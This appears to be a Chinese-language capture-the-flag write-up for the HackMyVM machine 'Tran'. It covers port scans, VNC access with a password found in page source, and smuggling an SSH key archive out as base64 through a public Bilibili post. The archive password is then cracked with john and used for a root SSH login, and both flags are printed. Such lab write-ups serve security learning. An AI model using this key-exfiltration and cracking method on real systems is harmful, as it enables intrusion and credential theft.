---
title: "Tran"
date: "2026-08-15T00:00:00+08:00"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "Tran_lily2663"
summary: "Tran"
tags:
  - "Shell"
params:
  protected: false
  commentId: "Tran_lily2663"
  legacyId: "Tran_lily2663"
---
# Tran

# 端口扫描

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -sV -T4 192.168.1.30
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 10:53 +0800
Nmap scan report for 192.168.1.30
Host is up (0.00094s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
```

web服务前端源码发现：

```
// chenzi
```

80没有信息了，猜测是没扫全

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -p- -v 192.168.1.30
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 11:51 +0800
Initiating Ping Scan at 11:51
Scanning 192.168.1.30 [4 ports]
Completed Ping Scan at 11:51, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:51
Completed Parallel DNS resolution of 1 host. at 11:51, 0.50s elapsed
Initiating SYN Stealth Scan at 11:51
Scanning 192.168.1.30 [65535 ports]
Discovered open port 22/tcp on 192.168.1.30
Discovered open port 80/tcp on 192.168.1.30
SYN Stealth Scan Timing: About 19.97% done; ETC: 11:53 (0:02:04 remaining)
SYN Stealth Scan Timing: About 48.17% done; ETC: 11:53 (0:01:06 remaining)
Discovered open port 6080/tcp on 192.168.1.30
Completed SYN Stealth Scan at 11:53, 104.19s elapsed (65535 total ports)
Nmap scan report for 192.168.1.30
Host is up (0.00089s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6080/tcp open  gue

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds
           Raw packets sent: 131151 (5.770MB) | Rcvd: 84 (3.372KB)
```

# USERFLAG

进入6080所在，密码chenzi

![1786593429791](/assets/img/typora/1786593429791.png)

随后翻到flag

![1786593535038](/assets/img/typora/1786593535038.png)

```
flag{user-c6e6681860bbd5c4d8db8100a85c3753}
```

# ROOTFLAG

发现私钥：![1786593619158](/assets/img/typora/1786593619158.png)

没法用，发现有base64，于是

```
base64 a.zip
```

其浏览器可以自由访问网站，登上b站，拿base64交个专栏，拿到本地

![1786601668504](/assets/img/typora/1786601668504.png)

```bash
//进行复原和密钥爆破


─$ base64 -d k.b64 > k.zip

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ ls
k.b64  k.zip

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ unzip k.zip
Archive:  k.zip
[k.zip] authorized_keys password:
┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ zip2john k.zip > hash.txt
ver 2.0 efh 5455 efh 7875 k.zip/authorized_keys PKZIP Encr: TS_chk, cmplen=869, decmplen=1124, crc=392ADCF2 ts=0762 cs=0762 type=8
ver 2.0 efh 5455 efh 7875 k.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1975, decmplen=2590, crc=7779EC2A ts=0759 cs=0759 type=8
ver 2.0 efh 5455 efh 7875 k.zip/id_rsa.pub PKZIP Encr: TS_chk, cmplen=471, decmplen=563, crc=CFB9A76B ts=0759 cs=0759 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
caca             (k.zip)
1g 0:00:00:00 DONE (2026-08-13 14:10) 14.28g/s 702171p/s 702171c/s 702171C/s 123456..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

以私钥登录flag

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ unzip k.zip
Archive:  k.zip
[k.zip] authorized_keys password:
  inflating: authorized_keys
  inflating: id_rsa
  inflating: id_rsa.pub

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ chmod 600 id_rsa //赋权

┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ ssh -i id_rsa chenzi@192.168.1.30
chenzi@192.168.1.30's password:


┌──(lily2663㉿LAPTOP-L8P806AH)-[~/trans]
└─$ ssh -i id_rsa root@192.168.1.30
Linux Tran 7.1.8-2-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.1-11.1~trixie (2026-08-11) x86_64

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM

QQ Group:   321948805


Last login: Wed Aug 12 02:04:06 2026 from 192.168.3.94
root@Tran:~# ls
pass.txt  root.txt
root@Tran:~# cat root.txt
flag{root-62866d98b3e121f99f186be7f87c9979}
root@Tran:~#
```



 VNC 客户端没有nc，curl，其他办法向vps传文件也超时，可能是网络设置问题还是题目本意？但是找到了这个办法算是非预期吗。